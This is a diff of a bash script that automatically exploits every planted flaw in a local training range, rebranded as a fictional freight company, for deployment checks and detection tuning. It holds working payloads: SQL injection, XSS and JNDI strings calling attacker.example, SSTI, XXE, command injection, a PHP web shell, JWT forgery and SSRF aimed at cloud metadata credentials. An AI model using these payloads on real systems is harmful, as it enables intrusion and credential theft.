@@ -1,99 +1,124 @@
 #!/usr/bin/env bash
-# Solves every challenge on the range end to end, submits each flag to the
-# scoreboard and reports pass/fail. Use it to verify a deployment and to confirm
-# that the SIEM detection use cases fire.
+# Exercises every finding on the Meridian Freight Solutions target end to end,
+# records each recovered value in the operator console, and reports pass/fail.
+#
+# Use it to verify a deployment and to generate a complete event set for
+# detection tuning.
 #
 #   ./tools/validate_range.sh http://127.0.0.1:5005
 set -uo pipefail
 
 BASE="${1:-http://127.0.0.1:5005}"
-APP_ROOT="${APP_ROOT:-/app}"          # container path used by file-read payloads
+APP_ROOT="${APP_ROOT:-/app}"                     # container path for file-read payloads
 TEAM="${TEAM:-validation-bot}"
-PYTHON="${PYTHON:-python3}"   # must be an interpreter that has Flask installed
+TOKEN="${RANGE_CONSOLE_TOKEN:-range-operator}"   # operator console gate
+PYTHON="${PYTHON:-python3}"                      # needs Flask only for the session forge
 JAR="$(mktemp -d)/cookies.txt"
 PASS=0; FAIL=0; declare -a FAILED=()
 
 c()  { curl -s -b "$JAR" -c "$JAR" -H "X-Lab-Test-ID: validate" "$@"; }
 cj() { c -H 'Content-Type: application/json' "$@"; }
 
-grab() { grep -o 'HELPAG{[^}]*}' | head -1; }
+# Proof values are embedded in recovered data, not returned in a labelled field.
+grab() { grep -o 'MERIDIAN{[^}]*}' | head -1; }
 
-submit() {  # submit <challenge-id> <flag>
-  local id="$1" flag="${2:-}"
-  if [[ -z "$flag" ]]; then
-    printf '  \033[31mFAIL\033[0m %-22s no flag recovered\n' "$id"; FAIL=$((FAIL+1)); FAILED+=("$id"); return
+record() {  # record <finding-id> <recovered-value>
+  local id="$1" value="${2:-}"
+  if [[ -z "$value" ]]; then
+    printf '  \033[31mFAIL\033[0m %-22s nothing recovered\n' "$id"
+    FAIL=$((FAIL+1)); FAILED+=("$id"); return
   fi
-  local body; body=$(cj -X POST "$BASE/api/ctf/submit" -d "{\"flag\":\"$flag\"}")
+  local body; body=$(cj -H "X-Range-Token: $TOKEN" -X POST "$BASE/range/api/submit" \
+                        -d "{\"value\":\"$value\"}")
   if grep -q '"correct":true' <<<"$body"; then
-    printf '  \033[32mPASS\033[0m %-22s %s\n' "$id" "$flag"; PASS=$((PASS+1))
+    printf '  \033[32mPASS\033[0m %-22s %s\n' "$id" "$value"; PASS=$((PASS+1))
   else
-    printf '  \033[31mFAIL\033[0m %-22s rejected: %s\n' "$id" "$body"; FAIL=$((FAIL+1)); FAILED+=("$id")
+    printf '  \033[31mFAIL\033[0m %-22s rejected: %s\n' "$id" "$body"
+    FAIL=$((FAIL+1)); FAILED+=("$id")
   fi
 }
 
-echo "== HELP AG VAPT range validation against $BASE =="
-cj -X POST "$BASE/api/ctf/team" -d "{\"team\":\"$TEAM\"}" >/dev/null
+echo "== Meridian target validation against $BASE =="
+cj -H "X-Range-Token: $TOKEN" -X POST "$BASE/range/api/team" -d "{\"team\":\"$TEAM\"}" >/dev/null
 
-echo "-- recon and misconfiguration --"
+echo "-- reconnaissance and exposed files --"
 c "$BASE/robots.txt" >/dev/null
-submit recon-robots       "$(c "$BASE/internal/engineering-notes.txt" | grab)"
-submit misconfig-debug    "$(c "$BASE/api/debug/config" | grab)"
-submit misconfig-dotenv   "$(c "$BASE/.env" | grab)"
+record recon-runbook       "$(c "$BASE/internal/it-runbook.txt" | grab)"
+record misconfig-debug     "$(c "$BASE/status/diagnostics" | grab)"
+record misconfig-dotenv    "$(c "$BASE/.env" | grab)"
 c "$BASE/backups/" >/dev/null
-submit misconfig-backups  "$(c "$BASE/backups/site-config.bak" | grab)"
+record misconfig-backups   "$(c "$BASE/backups/meridian-db-export.sql" | grab)"
 
-echo "-- access control --"
-submit access-idor        "$(c "$BASE/api/users/1337" | grab)"
-submit access-massassign  "$(cj -X POST "$BASE/api/profile/update" \
-                              -d '{"email":"a@lab.invalid","role":"admin"}' | grab)"
+echo "-- broken access control --"
+record idor-shipment       "$(c "$BASE/api/v1/shipments/MFS-2026-4471" | grab)"
+record access-massassign   "$(cj -X POST "$BASE/portal/profile" \
+                               -d '{"contact_name":"Dana Okafor","account_type":"operations"}' | grab)"
 
 echo "-- injection --"
-submit inject-sqli-union  "$(c -G "$BASE/api/products/search" \
-                              --data-urlencode "q=' UNION SELECT id,label,value FROM flags-- " | grab)"
-submit inject-sqli-auth   "$(cj -X POST "$BASE/api/legacy/login" \
-                              -d '{"username":"admin'\''-- ","password":"x"}' | grab)"
-submit xss-reflected      "$(c -G "$BASE/reflect" \
-                              --data-urlencode 'name=<script>alert(1)</script>' | grab)"
-cj -X POST "$BASE/guestbook" -d '{"author":"tester","message":"<script>fetch(\"/steal\")</script>"}' >/dev/null
-submit xss-stored         "$(c "$BASE/admin/review" | grab)"
-submit inject-jndi        "$(c -H 'X-Audit-Agent: ${jndi:ldap://attacker.lab.invalid/a}' \
-                              "$BASE/api/legacy/audit" | grab)"
+record sqli-union          "$(c -G "$BASE/api/v1/rates/search" \
+                               --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " | grab)"
+record sqli-authbypass     "$(cj -X POST "$BASE/portal/login?legacy=1" \
+                               -d '{"username":"ops_console'\''-- ","password":"x"}' | grab)"
+c -G "$BASE/search" --data-urlencode 'q=<script>alert(1)</script>' >/dev/null
+# The agent's captured cookie is base64; decode it to read the token inside.
+# base64 of a JSON object always begins "eyJ"; anchoring there avoids matching
+# the cookie name and the '=' that separates it.
+b64decode_grab() { grep -o 'eyJ[A-Za-z0-9+/=]*' | while read -r blob; do
+                     printf '%s' "$blob" | base64 -d 2>/dev/null; done | grab; }
+record xss-reflected       "$(c -G "$BASE/support/shared-search" \
+                               --data-urlencode 'q=<script>fetch("//attacker.example")</script>' \
+                               | b64decode_grab)"
+cj -X POST "$BASE/contact" \
+   -d '{"name":"tester","company":"Acme","email":"t@acme.example","message":"<script>steal()</script>"}' >/dev/null
 
 echo "-- file handling and code execution --"
-submit file-traversal     "$(c -G "$BASE/api/documents/download" \
-                              --data-urlencode 'file=../flagstore/traversal.flag' | grab)"
-submit rce-cmdi           "$(c -G "$BASE/api/diagnostics/ping" \
-                              --data-urlencode 'host=127.0.0.1; cat flagstore/cmdi.flag' | grab)"
-submit rce-ssti           "$(c -G "$BASE/api/newsletter/preview" --data-urlencode \
-   "template={{ cycler.__init__.__globals__.os.popen('cat flagstore/ssti.flag').read() }}" | grab)"
-XXE_BODY='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://'"$APP_ROOT"'/flagstore/xxe.flag">]><r>&x;</r>'
-submit inject-xxe         "$(c -X POST "$BASE/api/suppliers/import" \
-   -H 'Content-Type: application/xml' --data-binary "$XXE_BODY" | grab)"
-printf '<?php system($_GET["cmd"]); ?>\n' > /tmp/shell.php
-submit upload-unrestricted "$(c -X POST "$BASE/api/upload" -F 'file=@/tmp/shell.php' | grab)"
+record traversal-invoice   "$(c -G "$BASE/api/v1/invoices/download" \
+                               --data-urlencode '../instance/app-secrets.ini' \
+                               --data-urlencode 'document=../instance/app-secrets.ini' | grab)"
+record rce-cmdi            "$(cj -X POST "$BASE/admin/diagnostics" \
+                               -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}' | grab)"
+SSTI="{{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}"
+record rce-ssti            "$(c -G "$BASE/admin/campaigns/preview" --data-urlencode "body=$SSTI" | grab)"
+EDI_BODY='<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file://'"$APP_ROOT"'/instance/edi/partner-manifest.key">]><manifest>&x;</manifest>'
+record xxe-edi             "$(c -X POST "$BASE/api/v1/edi/manifest" \
+                               -H 'Content-Type: application/xml' --data-binary "$EDI_BODY" | grab)"
+printf '<?php system($_GET["c"]); ?>\n' > /tmp/cv.php
+c -X POST "$BASE/careers/apply" -F 'cv=@/tmp/cv.php' >/dev/null
+c "$BASE/uploads/" >/dev/null
+record upload-unrestricted "$(c "$BASE/uploads/hr-onboarding-pack-2026.txt" | grab)"
 
-echo "-- authentication --"
-for p in 123456 password letmein qwerty summer2024; do
-  cj -X POST "$BASE/api/login" -d "{\"username\":\"svc_backup\",\"password\":\"$p\"}" > /tmp/login.json
+echo "-- authentication and session handling --"
+for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
+  cj -X POST "$BASE/portal/login" -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}" > /tmp/login.json
 done
-submit auth-bruteforce    "$(grab < /tmp/login.json)"
-TOKEN="$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '/+' '_-')"
-TOKEN="$TOKEN.$(printf '%s' '{"sub":"attacker","role":"admin"}' | base64 | tr -d '=\n' | tr '/+' '_-')."
-submit auth-jwt-none      "$(c -H "Authorization: Bearer $TOKEN" "$BASE/api/admin/report" | grab)"
+record auth-bruteforce     "$(grab < /tmp/login.json)"
+
+HEADER="$(printf '%s' '{"alg":"none","typ":"JWT"}'          | base64 | tr -d '=\n' | tr '/+' '_-')"
+PAYLOAD="$(printf '%s' '{"sub":"harborline","role":"finance"}' | base64 | tr -d '=\n' | tr '/+' '_-')"
+record jwt-none            "$(c -H "Authorization: Bearer $HEADER.$PAYLOAD." \
+                               "$BASE/api/v1/reports/financial" | grab)"
+
 md5of() { if command -v md5sum >/dev/null; then printf '%s' "$1" | md5sum | cut -d' ' -f1;
           else printf '%s' "$1" | md5 -q; fi; }
-RESET="$(md5of j.ellison)"
-RESET_BODY='{"username":"j.ellison","token":"'"$RESET"'"}'
-cj -X POST "$BASE/api/password-reset/request" -d '{"username":"j.ellison"}' >/dev/null
-submit auth-reset-token   "$(cj -X POST "$BASE/api/password-reset/consume" -d "$RESET_BODY" | grab)"
-FORGED="$("$PYTHON" tools/forge_session.py --secret "${LAB_SESSION_SECRET:-deliberately-weak-lab-secret}")"
-submit auth-weak-secret   "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin/panel" | grab)"
+RESET="$(md5of avoss)"
+RESET_BODY='{"username":"avoss","token":"'"$RESET"'"}'
+cj -X POST "$BASE/portal/reset" -d '{"username":"avoss"}' >/dev/null
+record reset-token         "$(cj -X POST "$BASE/api/v1/account/reset" -d "$RESET_BODY" | grab)"
 
-echo "-- ssrf and business logic --"
-submit ssrf-metadata      "$(c -G "$BASE/api/fetch" --data-urlencode \
-   "url=${METADATA_URL:-http://metadata:8080}/latest/meta-data/iam/security-credentials/lab-instance-role" | grab)"
-submit logic-negative     "$(cj -X POST "$BASE/api/checkout" \
-                              -d '{"quantity":-5,"unit_price":900}' | grab)"
+FORGED="$("$PYTHON" tools/forge_session.py --secret "${LAB_SESSION_SECRET:-meridian-default-signing-key}")"
+record weak-session-secret "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grab)"
+
+echo "-- stored payload rendered by staff --"
+record xss-stored          "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin/messages" \
+                               | b64decode_grab)"
+
+echo "-- ssrf, business logic and vulnerable components --"
+record ssrf-metadata       "$(c -G "$BASE/admin/integrations/preview" --data-urlencode \
+  "url=${METADATA_URL:-http://metadata:8080}/latest/meta-data/iam/security-credentials/mfs-web-instance-role" | grab)"
+record logic-negative-quote "$(cj -X POST "$BASE/services/quote" \
+                               -d '{"weight_kg":-1200,"rate_per_kg":0.42}' | grab)"
+record jndi-audit          "$(c -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' \
+                               "$BASE/api/v1/audit/event" | grab)"
 
 echo
 echo "== $PASS passed, $FAIL failed =="
